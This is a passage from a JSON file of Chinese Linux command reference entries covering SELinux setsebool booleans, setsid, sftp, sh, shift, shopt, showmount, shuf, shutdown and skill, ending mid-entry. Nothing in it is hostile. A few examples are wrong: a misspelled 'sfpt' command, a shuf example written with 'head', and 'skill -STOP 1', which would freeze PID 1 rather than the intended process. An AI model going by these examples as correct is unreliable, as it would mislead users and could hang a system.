class=\"hljs-attribute\">allow_smbd_anon_write</span>=1\n</code></pre>\n<p>samba服务器要共享家目录时：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">setsebool</span> -P samba_enable_home_dirs <span class=\"hljs-number\">1</span>\n</code></pre>\n<p>如果你需在本机上使用远程samba服务器的家目录：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">setsebool</span> -P use_samba_home_dirs <span class=\"hljs-number\">1</span>\n</code></pre>\n<p>关闭selinux关于samba的进程守护的保护：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">setsebool</span> -P smbd_disable_trans <span class=\"hljs-number\">1</span>\n<span class=\"hljs-attribute\">service</span> smb restart\n</code></pre>\n<p>允许rsync其他用户写入时：</p>\n<pre><code class=\"language-shell\">setsebool -P <span class=\"hljs-attribute\">allow_rsync_anon_write</span>=1\n</code></pre>\n<p>停止rsync的进程保护</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">setsebool</span> -P rsync_disable_trans <span class=\"hljs-number\">1</span>\n</code></pre>\n<p>允许系统使用kerberos：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">setsebool</span> -P allow_kerberos <span class=\"hljs-number\">1</span>\n</code></pre>\n<p>系统工作在nis环境时：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">setsebool</span> -P allow_ypbind <span class=\"hljs-number\">1</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "setsid",
        "des": "在新的会话中运行程序",
        "body": "<h1 id=\"setsid\">setsid</h1>\n<p>在新的会话中运行程序</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>setsid命令</strong> 子进程从父进程继承了：SessionID、进程组ID和打开的终端。子进程如果要脱离这些，代码中可通过调用setsid来实现。，而命令行或脚本中可以通过使用命令setsid来运行程序实现。setsid帮助一个进程脱离从父进程继承而来的已打开的终端、隶属进程组和隶属的会话。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">setsid<span class=\"hljs-selector-attr\">[options]</span> &lt;program&gt; <span class=\"hljs-selector-attr\">[arguments ...]</span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\">-c, <span class=\"hljs-comment\">--ctty   将控制终端设置为当前控制终端</span>\n-f, <span class=\"hljs-comment\">--fork   总是 fork</span>\n-w, <span class=\"hljs-comment\">--wait   等待程序退出，并使用相同的返回</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>可见 setsid 的使用也是非常方便的，也只需在要处理的命令前加上 setsid 即可</p>\n<pre><code class=\"language-shell\">[root@root ~]# setsid ping www.ibm.<span class=\"hljs-keyword\">com</span>\n[root@root ~]# <span class=\"hljs-keyword\">ps</span> -ef |<span class=\"hljs-keyword\">grep</span> www.ibm.<span class=\"hljs-keyword\">com</span>\nroot <span class=\"hljs-number\">31094</span> <span class=\"hljs-number\">1</span> <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">07</span>:<span class=\"hljs-number\">28</span> ? <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span> ping www.ibm.<span class=\"hljs-keyword\">com</span>\nroot <span class=\"hljs-number\">31102</span> <span class=\"hljs-number\">29217</span> <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">07</span>:<span class=\"hljs-number\">29</span> <span class=\"hljs-keyword\">pts</span>/<span class=\"hljs-number\">4</span> <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span> <span class=\"hljs-keyword\">grep</span> www.ibm.<span class=\"hljs-keyword\">com</span>\n[root@root ~]#\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "sftp-server",
        "des": "sftp协议的服务器端程序",
        "body": "<h1 id=\"sftp-server\">sftp-server</h1>\n<p>sftp协议的服务器端程序</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>sftp-server命令</strong> 是一个“sftp”协议的服务器端程序，它使用加密的方式进行文件传输。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">sftp-<span class=\"hljs-keyword\">server</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "sftp",
        "des": "交互式的文件传输程序",
        "body": "<h1 id=\"sftp\">sftp</h1>\n<p>交互式的文件传输程序</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>sftp命令</strong> 是一款交互式的文件传输程序，命令的运行和使用方式与ftp命令相似，但是，sftp命令对传输的所有信息使用ssh加密，它还支持公钥认证和压缩等功能。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">sftp</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-B：指定传输文件时缓冲区的大小；</span>\n<span class=\"hljs-deletion\">-l：使用ssh协议版本1；</span>\n<span class=\"hljs-deletion\">-b：指定批处理文件；</span>\n<span class=\"hljs-deletion\">-C：使用压缩；</span>\n<span class=\"hljs-deletion\">-o：指定ssh选项；</span>\n<span class=\"hljs-deletion\">-F：指定ssh配置文件；</span>\n<span class=\"hljs-deletion\">-R：指定一次可以容忍多少请求数；</span>\n<span class=\"hljs-deletion\">-v：升高日志等级。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>目标主机：指定sftp服务器ip地址或者主机名。</p>\n<h3 id=\"实例\">实例</h3>\n<p>建立联接</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-variable\">$ </span>sfpt username<span class=\"hljs-variable\">@1</span>.<span class=\"hljs-number\">1.1</span>.<span class=\"hljs-number\">1</span> <span class=\"hljs-comment\"># 回车输入密码</span>\n</code></pre>\n<p>获取文件下载到指定路径</p>\n<pre><code class=\"language-shell\">sftp&gt; get <span class=\"hljs-regexp\">/export/</span>sftp<span class=\"hljs-regexp\">/test.csv /</span>Users<span class=\"hljs-regexp\">/my/</span>Downloads\nFetching <span class=\"hljs-regexp\">/export/</span>sftp<span class=\"hljs-regexp\">/test.csv to /</span>Users<span class=\"hljs-regexp\">/my/</span>Downloads/test.csv\n<span class=\"hljs-regexp\">/export/</span>sftp<span class=\"hljs-regexp\">/test.csv            100%  133     0.3KB/</span>s   <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>\n</code></pre>\n<p>上传本地文件到服务器指定路径</p>\n<pre><code class=\"language-shell\">sftp&gt; put <span class=\"hljs-regexp\">/Users/my</span><span class=\"hljs-regexp\">/Downloads/</span>re-produce.gif <span class=\"hljs-regexp\">/export/</span>sftp\nUploading <span class=\"hljs-regexp\">/Users/my</span><span class=\"hljs-regexp\">/Downloads/</span>re-produce.gif to <span class=\"hljs-regexp\">/export/</span>sftp/re-produce.gif\n<span class=\"hljs-regexp\">/Users/my</span><span class=\"hljs-regexp\">/Downloads/</span>re-produce.gif            <span class=\"hljs-number\">100</span>%  <span class=\"hljs-number\">257</span>KB  <span class=\"hljs-number\">86.6</span>KB/s   <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">02</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "sh",
        "des": "shell命令解释器",
        "body": "<h1 id=\"sh\">sh</h1>\n<p>shell命令解释器</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>sh命令</strong> 是shell命令语言解释器，执行命令从标准输入读取或从一个文件中读取。通过用户输入命令，和内核进行沟通！Bourne Again Shell （即bash）是自由软件基金会（GNU）开发的一个Shell，它是Linux系统中一个默认的Shell。Bash不但与Bourne Shell兼容，还继承了C Shell、Korn Shell等优点。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">bash <span class=\"hljs-selector-attr\">[options]</span> <span class=\"hljs-selector-attr\">[file]</span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-c string：命令从-c后的字符串读取。</span>\n<span class=\"hljs-deletion\">-i：实现脚本交互。</span>\n<span class=\"hljs-deletion\">-n：进行shell脚本的语法检查。</span>\n<span class=\"hljs-deletion\">-x：实现shell脚本逐条语句的跟踪。</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>使用-x选项跟踪脚本调试shell脚本，能打印出所执行的每一行命令以及当前状态：</p>\n<pre><code class=\"language-shell\">[root@AY1307311912260196fcZ satools]# sh -x check_ssh_login.sh\n+ <span class=\"hljs-attribute\">DEFINE</span>=30\n+ cat /var/log/secure\n+ awk <span class=\"hljs-string\">'/Failed/ {++ip[$(NF-3)]} END {for (i in ip) print i\"=\"ip[i]}'</span>\n++ cat /root/satools/black.txt\n+ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> <span class=\"hljs-string\">'`cat /root/satools/black.txt`'</span>\n++ echo 121.42.0.<span class=\"hljs-attribute\">16</span>=1427\n++ awk -F= <span class=\"hljs-string\">'{print $1}'</span>\n+ <span class=\"hljs-attribute\">IP</span>=121.42.0.16\n++ echo 121.42.0.<span class=\"hljs-attribute\">16</span>=1427\n++ awk -F= <span class=\"hljs-string\">'{print $2}'</span>\n+ <span class=\"hljs-attribute\">NUM</span>=1427\n+ <span class=\"hljs-string\">'['</span> 1427 -gt 30 <span class=\"hljs-string\">']'</span>\n+ grep 121.42.0.16 /etc/hosts.deny\n+ <span class=\"hljs-string\">'['</span> 1 -gt 0 <span class=\"hljs-string\">']'</span>\n+ echo sshd:121.42.0.16\n+ echo vsftpd:121.42.0.16\n+ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> <span class=\"hljs-string\">'`cat /root/satools/black.txt`'</span>\n++ echo 121.42.0.<span class=\"hljs-attribute\">72</span>=276\n++ awk -F= <span class=\"hljs-string\">'{print $1}'</span>\n+ <span class=\"hljs-attribute\">IP</span>=121.42.0.72\n++ awk -F= <span class=\"hljs-string\">'{print $2}'</span>\n++ echo 121.42.0.<span class=\"hljs-attribute\">72</span>=276\n+ <span class=\"hljs-attribute\">NUM</span>=276\n+ <span class=\"hljs-string\">'['</span> 276 -gt 30 <span class=\"hljs-string\">']'</span>\n+ grep 121.42.0.72 /etc/hosts.deny\n+ <span class=\"hljs-string\">'['</span> 1 -gt 0 <span class=\"hljs-string\">']'</span>\n+ echo sshd:121.42.0.72\n+ echo vsftpd:121.42.0.72\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "shift",
        "des": "移动位置参数。",
        "body": "<h1 id=\"shift\">shift</h1>\n<p>移动位置参数。</p>\n<h2 id=\"概要\">概要</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">shift</span><span class=\"hljs-meta\"> [n]</span>\n</code></pre>\n<h2 id=\"主要用途\">主要用途</h2>\n<ul>\n<li>将位置参数<code>$n, $n+1...</code>重命名为<code>$1, $2...</code>。</li>\n</ul>\n<h2 id=\"参数\">参数</h2>\n<p>n（可选）：大于等于1且小于等于参数个数的整数，默认为1。</p>\n<h2 id=\"返回值\">返回值</h2>\n<p>返回成功除非n大于参数个数或n小于1以及其他非法值。</p>\n<h2 id=\"例子\">例子</h2>\n<p>假设我们的脚本文件（test.sh）如下：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-meta\">#!/usr/bin/env bash</span>\n<span class=\"hljs-comment\"># 显示前三个位置参数。</span>\n<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$1</span> <span class=\"hljs-variable\">$2</span> <span class=\"hljs-variable\">$3</span>\"</span>\n<span class=\"hljs-comment\"># 移除前两个位置参数，并将$3重命名为$1，之后的以此类推。</span>\n<span class=\"hljs-built_in\">shift</span> 2\n<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$1</span> <span class=\"hljs-variable\">$2</span> <span class=\"hljs-variable\">$3</span>\"</span>\n</code></pre>\n<p>在终端执行该脚本：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">sh</span> <span class=\"hljs-keyword\">test</span>.<span class=\"hljs-keyword\">sh</span> q w <span class=\"hljs-keyword\">e</span> r t\n</code></pre>\n<p>返回信息如下：</p>\n<pre><code class=\"language-shell\">q w <span class=\"hljs-built_in\">e</span>\n<span class=\"hljs-built_in\">e</span> r t\n</code></pre>\n<h3 id=\"注意\">注意</h3>\n<ol>\n<li>该命令是bash内建命令，相关的帮助信息请查看<code>help</code>命令。</li>\n</ol>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "shopt",
        "des": "显示和设置shell操作选项",
        "body": "<h1 id=\"shopt\">shopt</h1>\n<p>显示和设置shell操作选项</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>shopt命令</strong> 用于显示和设置shell中的行为选项，通过这些选项以增强shell易用性。shopt命令若不带任何参数选项，则可以显示所有可以设置的shell操作选项。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">shopt</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-s：激活指定的shell行为选项；</span>\n<span class=\"hljs-deletion\">-u：关闭指定的shell行为选项。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>shell选项：指定要操作的shell选项。</p>\n<h3 id=\"实例\">实例</h3>\n<p>使用shopt命令显示当前所有可以设置的shell操作选项，输入如下命令：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">shopt</span>           <span class=\"hljs-comment\">#输出所有可以设置的shell操作选项</span>\ncdable_vars     <span class=\"hljs-literal\">off</span>\ncdspell         <span class=\"hljs-literal\">off</span>\ncheckhash       <span class=\"hljs-literal\">off</span>\ncheckwinsize    <span class=\"hljs-literal\">on</span>\ncmdhist         <span class=\"hljs-literal\">on</span>\ndotglob         <span class=\"hljs-literal\">off</span>\nexecfail        <span class=\"hljs-literal\">off</span>\nexpand_aliases  <span class=\"hljs-literal\">on</span>\nextdebug        <span class=\"hljs-literal\">off</span>\n...\n</code></pre>\n<p>如图上所示，选项\"cdspell\"的状态为\"off\"，即关闭cd拼写检查选项。现在，可以使用shopt命令将其开启，输入如下命令：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">shopt</span> -s cdspell          <span class=\"hljs-comment\">#开启cd拼写检查</span>\n</code></pre>\n<p>执行上面的命令后，该选项的状态将变为\"on\"，即开启状态。可以再次通过该命令显示一下shell操作选项即可，输出信息如下：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">cdspell</span> <span class=\"hljs-literal\">on</span>                <span class=\"hljs-comment\">#开启cdspell选项</span>\n</code></pre>\n<p>用户可以通过实际执行cd命令检查该选项是否被成功开启。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "showmount",
        "des": "显示NFS服务器加载的信息",
        "body": "<h1 id=\"showmount\">showmount</h1>\n<p>显示NFS服务器加载的信息</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>showmount命令</strong> 查询“mountd”守护进程，以显示NFS服务器加载的信息。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">showmount</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-d：仅显示已被NFS客户端加载的目录；</span>\n<span class=\"hljs-deletion\">-e：显示NFS服务器上所有的共享目录。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>NFS服务器：指定NFS服务器的ip地址或者主机名。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "shuf",
        "des": "产生随机的排列。",
        "body": "<h1 id=\"shuf\">shuf</h1>\n<p>产生随机的排列。</p>\n<h2 id=\"概要\">概要</h2>\n<pre><code class=\"language-shell\">shuf [<span class=\"hljs-symbol\">OPTION</span>]... [<span class=\"hljs-symbol\">FILE</span>]\nshuf -e [<span class=\"hljs-symbol\">OPTION</span>]... [<span class=\"hljs-symbol\">ARG</span>]...\nshuf -i <span class=\"hljs-symbol\">LO</span>-<span class=\"hljs-symbol\">HI</span> [<span class=\"hljs-symbol\">OPTION</span>]...\n</code></pre>\n<h2 id=\"主要用途\">主要用途</h2>\n<ul>\n<li>将输入的内容随机排列并输出。</li>\n<li>当没有文件或文件为<code>-</code>时，读取标准输入。</li>\n</ul>\n<h2 id=\"选项\">选项</h2>\n<pre><code class=\"language-shell\">-<span class=\"hljs-keyword\">e</span>, --echo                  将每个ARG视为输入行。\n-i, --<span class=\"hljs-keyword\">input</span>-<span class=\"hljs-keyword\">range</span>=LO-HI     将数字范围LO（最低）到HI（最高）之间的作为输入行。\n-<span class=\"hljs-keyword\">n</span>, --head-<span class=\"hljs-keyword\">count</span>=<span class=\"hljs-keyword\">COUNT</span>      只输出前<span class=\"hljs-keyword\">COUNT</span>行。\n-o, --output=<span class=\"hljs-keyword\">FILE</span>           将结果写入到文件而不是标准输出。\n    --random-source=<span class=\"hljs-keyword\">FILE</span>    将<span class=\"hljs-keyword\">FILE</span>中内容作为随机数据源。\n-r, --<span class=\"hljs-keyword\">repeat</span>                输出行可以重复。\n-z, --zero-terminated       行终止符为NUL（空字符）而不是默认的换行符。\n--<span class=\"hljs-keyword\">help</span>                      显示帮助信息并退出。\n--<span class=\"hljs-keyword\">version</span>                   显示版本信息并退出。\n</code></pre>\n<h2 id=\"参数\">参数</h2>\n<p>FILE（可选）：要处理的文件，可以为任意数量。</p>\n<p>ARG（可选）：作为输入行的字符串，可以为任意数量。</p>\n<h2 id=\"返回值\">返回值</h2>\n<p>返回0表示成功，返回非0值表示失败。</p>\n<h2 id=\"例子\">例子</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 模拟硬币抛掷，获取前10个结果：</span>\n[user2<span class=\"hljs-variable\">@pc</span> ~]<span class=\"hljs-variable\">$ </span>head -r -n <span class=\"hljs-number\">10</span> -e <span class=\"hljs-string\">\"正面\"</span> -e <span class=\"hljs-string\">\"反面\"</span>\n反面\n正面\n正面\n正面\n反面\n反面\n反面\n正面\n正面\n正面\n</code></pre>\n<pre><code class=\"language-shell\"># 体彩超级大乐透：\n[user2@pc ~]$ shuf -i <span class=\"hljs-number\">1</span>-<span class=\"hljs-number\">35</span> -<span class=\"hljs-built_in\">n</span> <span class=\"hljs-number\">5</span>|sort -<span class=\"hljs-built_in\">n</span> &amp;&amp; shuf -i <span class=\"hljs-number\">1</span>-<span class=\"hljs-number\">12</span> -<span class=\"hljs-built_in\">n</span> <span class=\"hljs-number\">2</span>|sort -<span class=\"hljs-built_in\">n</span>\n<span class=\"hljs-number\">4</span>\n<span class=\"hljs-number\">17</span>\n<span class=\"hljs-number\">20</span>\n<span class=\"hljs-number\">29</span>\n<span class=\"hljs-number\">31</span>\n<span class=\"hljs-number\">6</span>\n<span class=\"hljs-number\">11</span>\n</code></pre>\n<h3 id=\"注意\">注意</h3>\n<ol>\n<li>该命令是<code>GNU coreutils</code>包中的命令，更多详细的帮助信息请查看<code>man -s 1 shuf</code>，<code>info coreutils 'shuf invocation'</code>。</li>\n</ol>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "shutdown",
        "des": "用来执行系统关机的命令",
        "body": "<h1 id=\"shutdown\">shutdown</h1>\n<p>用来执行系统关机的命令</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>shutdown命令</strong> 用来系统关机命令。shutdown指令可以关闭所有程序，并依用户的需要，进行重新开机或关机的动作。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">shutdown</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-c：当执行“shutdown -h 11:50”指令时，只要按+键就可以中断关机的指令；</span>\n<span class=\"hljs-deletion\">-f：重新启动时不执行fsck；</span>\n<span class=\"hljs-deletion\">-F：重新启动时执行fsck；</span>\n<span class=\"hljs-deletion\">-h：将系统关机；</span>\n<span class=\"hljs-deletion\">-k：只是送出信息给所有用户，但不会实际关机；</span>\n<span class=\"hljs-deletion\">-n：不调用init程序进行关机，而由shutdown自己进行；</span>\n<span class=\"hljs-deletion\">-r：shutdown之后重新启动；</span>\n<span class=\"hljs-deletion\">-t&lt;秒数&gt;：送出警告信息和删除信息之间要延迟多少秒。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<ul>\n<li>  [时间]：设置多久时间后执行shutdown指令；</li>\n<li>  [警告信息]：要传送给所有登入用户的信息。</li>\n</ul>\n<h3 id=\"实例\">实例</h3>\n<p>指定现在立即关机：</p>\n<pre><code class=\"language-shell\">shutdown -h now\n</code></pre>\n<p>指定5分钟后关机，同时送出警告信息给登入用户：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">shutdown</span> +<span class=\"hljs-number\">5</span> <span class=\"hljs-string\">\"System will shutdown after 5 minutes\"</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "skill",
        "des": "向选定的进程发送信号冻结进程",
        "body": "<h1 id=\"skill\">skill</h1>\n<p>向选定的进程发送信号冻结进程</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>skill命令</strong> 用于向选定的进程发送信号，冻结进程。这个命令初学者并不常用，深入之后牵涉到系统服务优化之后可能会用到。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">skill</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-f：快速模式；</span>\n<span class=\"hljs-deletion\">-i：交互模式，每一步操作都需要确认；</span>\n<span class=\"hljs-deletion\">-v：冗余模式；</span>\n<span class=\"hljs-deletion\">-w：激活模式；</span>\n<span class=\"hljs-deletion\">-V：显示版本号；</span>\n<span class=\"hljs-deletion\">-t：指定开启进程的终端号；</span>\n<span class=\"hljs-deletion\">-u：指定开启进程的用户；</span>\n<span class=\"hljs-deletion\">-p：指定进程的id号；</span>\n<span class=\"hljs-deletion\">-c：指定开启进程的指令名称。</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>如果您发现了一个占用大量CPU和内存的进程，但又不想停止它，该怎么办？考虑下面的top命令输出：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">top</span> -c -p <span class=\"hljs-number\">16514</span>\n<span class=\"hljs-attribute\">23</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">44</span>  up <span class=\"hljs-number\">12</span> days,  <span class=\"hljs-number\">2</span>:<span class=\"hljs-number\">04</span>,  <span class=\"hljs-number\">4</span> users,  load average: <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">47</span>, <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">35</span>, <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">31</span>\n<span class=\"hljs-attribute\">1</span> processes: <span class=\"hljs-number\">1</span> sleeping, <span class=\"hljs-number\">0</span> running, <span class=\"hljs-number\">0</span> zombie, <span class=\"hljs-number\">0</span> stopped\n<span class=\"hljs-attribute\">CPU</span> states:  cpu    user    nice  system    irq  softirq  iowait    idle\n           <span class=\"hljs-attribute\">total</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">0</span>%    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">6</span>%    <span class=\"hljs-number\">8</span>.<span class=\"hljs-number\">7</span>%   <span class=\"hljs-number\">2</span>.<span class=\"hljs-number\">2</span>%     <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">0</span>%   <span class=\"hljs-number\">88</span>.<span class=\"hljs-number\">3</span>%    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">0</span>%\n<span class=\"hljs-attribute\">Mem</span>:  <span class=\"hljs-number\">1026912</span>k av, <span class=\"hljs-number\">1010476</span>k used,   <span class=\"hljs-number\">16436</span>k free,       <span class=\"hljs-number\">0</span>k shrd,   <span class=\"hljs-number\">52128</span>k buff\n                    <span class=\"hljs-attribute\">766724k</span> actv,  <span class=\"hljs-number\">143128</span>k in_d,   <span class=\"hljs-number\">14264</span>k in_c\n<span class=\"hljs-attribute\">Swap</span>: <span class=\"hljs-number\">2041192</span>k av,   <span class=\"hljs-number\">83160</span>k used, <span class=\"hljs-number\">1958032</span>k free                  <span class=\"hljs-number\">799432</span>k cached\n\n  <span class=\"hljs-attribute\">PID</span> USER     PRI  NI  SIZE  RSS SHARE stat %CPU %MEM   time CPU command\n<span class=\"hljs-attribute\">16514</span> oracle    <span class=\"hljs-number\">19</span>   <span class=\"hljs-number\">4</span> <span class=\"hljs-number\">28796</span>  <span class=\"hljs-number\">26</span>M <span class=\"hljs-number\">20252</span> D N   <span class=\"hljs-number\">7</span>.<span class=\"hljs-number\">0</span>  <span class=\"hljs-number\">2</span>.<span class=\"hljs-number\">5</span>   <span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">03</span>   <span class=\"hljs-number\">0</span> oraclePRODB2...\n</code></pre>\n<p>既然您确认进程16514占用了大量内存，您就可以使用skill命令“冻结”它，而不是停止它。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">skill</span> -<span class=\"hljs-built_in\">STOP</span> <span class=\"hljs-number\">1</span>\n</code></pre>\n<p>之后，检查top输出：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">23</span>:<span class=\"hljs-number\">01</span>:<span class=\"hljs-number\">11</span>  up <span class=\"hljs-number\">12</span> days,  <span class=\"hljs-number\">2</span>:<span class=\"hljs-number\">05</span>,  <span class=\"hljs-number\">4</span> users,  load average: <span class=\"hljs-number\">1</span>.<span class=\"hljs-number\">20</span>, <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">54</span>, <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">38</span>\n<span class=\"hljs-attribute\">1</span> processes: <span class=\"hljs-number\">0</span> sleeping, <span class=\"hljs-number\">0</span> running, <span class=\"hljs-number\">0</span> zombie, <span class=\"hljs-number\">1</span> stopped\n<span class=\"hljs-attribute\">CPU</span> states:  cpu    user    nice  system    irq  softirq  iowait    idle\n           <span class=\"hljs-attribute\">total</span>    <span class=\"hljs-number\">2</span>.<span class=\"hljs-number\">3</span>%    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">0</span>%    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">3</span>%   <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">0</span>%     <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">0</span>%    <span class=\"hljs-number\">2</span>.<span class=\"hljs-number\">3</span>%   <span class=\"hljs-number\">94</span>.<span class=\"hljs-number\">8</span>%\n<span class=\"hljs-attribute\">Mem</span>:  <span class=\"hljs-number\">1026912</span>k av, <span class=\"hljs-number\">1008756</span>k used,   <span class=\"hljs-number\">18156</span>k free,       <span class=\"hljs-number\">0</span>k shrd,    <span class=\"hljs-number\">3976</span>k buff\n                    <span class=\"hljs-attribute\">770024k</span> actv,  <span class=\"hljs-number\">143496</span>k in_d,   <span class=\"hljs-number\">12876</span>k in_c\n<span class=\"hljs-attribute\">Swap</span>: <span class=\"hljs-number\">2041192</span>k av,   <span class=\"hljs-number\">83152</span>k used, <span class=\"hljs-number\">1958040</span>k free                  <span class=\"hljs-number\">851200</span>k cached\n\n  <span class=\"hljs-attribute\">PID</span> USER     PRI  NI  SIZE  RSS SHARE STAT %CPU %MEM   TIME CPU COMMAND\n<span class=\"hljs-attribute\">16514</span> oracle    <span class=\"hljs-number\">19</span>   <span class=\"hljs-number\">4</span> <span class=\"hljs-number\">28796</span>  <span class=\"hljs-number\">26</span>M <span class=\"hljs-number\">20252</span> T N   <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">0</span>  <span class=\"hljs-number\">2</span>.<span class=\"hljs-number\">5</span>   <span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">04</span>   <span class=\"hljs-number\">0</span> oraclePRODB2...\n</code></pre>\n<p>现在，CPU 从 0% 空闲变为 94% 空闲。该进程被有效冻结。过一段时间之后，您可能希望唤醒该进程：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">skill</span> -CONT <span class=\"hljs-number\">16514</span>\n</code></pre>\n<p>如果希望暂时冻结进程以便为完成更重要的进程腾出空间，该方法非常有用。</p>\n<p>此命令用途很广。如果您要停止 \"oracle\" 用户的所有进程，只需要一个命令即可实现：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">skill</span> -<span class=\"hljs-built_in\">STOP</span> oracle\n</code></pre>\n<p>可以使用用户、PID、命令或终端 id 作为参数。以下命令可停止所有 rman 